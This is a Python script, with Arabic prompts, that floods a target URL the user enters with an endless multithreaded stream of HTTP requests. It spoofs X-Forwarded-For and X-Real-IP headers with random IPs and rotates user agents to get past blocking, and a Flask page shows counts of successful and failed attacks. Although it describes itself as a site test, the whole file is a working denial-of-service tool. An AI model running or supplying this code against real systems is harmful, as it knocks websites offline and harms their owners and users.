import requests
from flask import Flask, render_template_string
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
from user_agent import generate_user_agent

a1 = '\x1b[1;31m'  
a3 = '\x1b[1;32m'  
a20 = '\x1b[38;5;226m' 
a22 = '\x1b[38;5;216m'  

app = Flask(__name__)
Almunharif_port_001 = 4000
Almunharif_url_002 = input(f'{a20}أدخل رابط الموقع لاختباره (URL): ')

# إضافة إدخال عدد الخيوط وعدد الطلبات
Almunharif_threads_010 = int(input(f'{a20}أدخل عدد الخيوط (Threads) (مثلاً 100): '))
Almunharif_requests_per_thread_011 = int(input(f'{a20}أدخل عدد الطلبات لكل خيط (مثلاً 1000): '))

print()
print(f'{a3}قم بفتح الرابط http://localhost:{Almunharif_port_001} في المتصفح لمتابعة الإحصائيات')
print()

Almunharif_success_count_003 = 0
Almunharif_failure_count_004 = 0
lock = threading.Lock()  

def Almunharif_generate_random_ip_005():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def Almunharif_send_request_with_retry_006(session, retries=3, delay=1):
    global Almunharif_success_count_003, Almunharif_failure_count_004
    Almunharif_user_agent_007 = generate_user_agent()
    Almunharif_random_ip_008 = Almunharif_generate_random_ip_005()

    Almunharif_headers_009 = {
        "User-Agent": Almunharif_user_agent_007,
        "X-Forwarded-For": Almunharif_random_ip_008,
        "X-Real-IP": Almunharif_random_ip_008
    }

    for _ in range(retries):
        try:
            response = session.get(Almunharif_url_002, headers=Almunharif_headers_009, timeout=5)
            if response.status_code == 200:
                with lock:
                    Almunharif_success_count_003 += 1
                return
        except requests.RequestException:
            time.sleep(delay)
    with lock:
        Almunharif_failure_count_004 += 1

def Almunharif_start_massive_attack_012():
    with ThreadPoolExecutor(max_workers=Almunharif_threads_010) as executor:
        with requests.Session() as session:
            while True:
                futures = []
                for _ in range(Almunharif_threads_010):
                    futures.append(executor.submit(
                        lambda: [Almunharif_send_request_with_retry_006(session) for _ in range(Almunharif_requests_per_thread_011)]
                    ))
                for future in futures:
                    future.result()

@app.route('/')
def Almunharif_index_016():
    return render_template_string('''
        <html>
            <head>
                <title>احصائيات الهجمات</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        text-align: center;
                        background-color: #1a1a2e;
                        color: #e94560;
                        margin: 0;
                        padding: 0;
                    }
                    h1 {
                        margin-top: 50px;
                        font-size: 36px;
                    }
                    p {
                        font-size: 20px;
                        margin: 10px 0;
                    }
                    .stats {
                        margin-top: 30px;
                        padding: 20px;
                        background: #0f3460;
                        border-radius: 10px;
                        display: inline-block;
                        box-shadow: 0 0 10px #e94560;
                    }
                </style>
            </head>
            <body>
                <h1>احصائيات الهجمات</h1>
                <div class="stats">
                    <p><strong>الهجمات الناجحة:</strong> {{ Almunharif_success_count_003 }}</p>
                    <p><strong>الهجمات الفاشلة:</strong> {{ Almunharif_failure_count_004 }}</p>
                </div>
            </body>
        </html>
    ''', Almunharif_success_count_003=Almunharif_success_count_003, Almunharif_failure_count_004=Almunharif_failure_count_004)

Almunharif_attack_thread_017 = threading.Thread(target=Almunharif_start_massive_attack_012, daemon=True)
Almunharif_attack_thread_017.start()

if __name__ == '__main__':
    app.run(port=Almunharif_port_001)
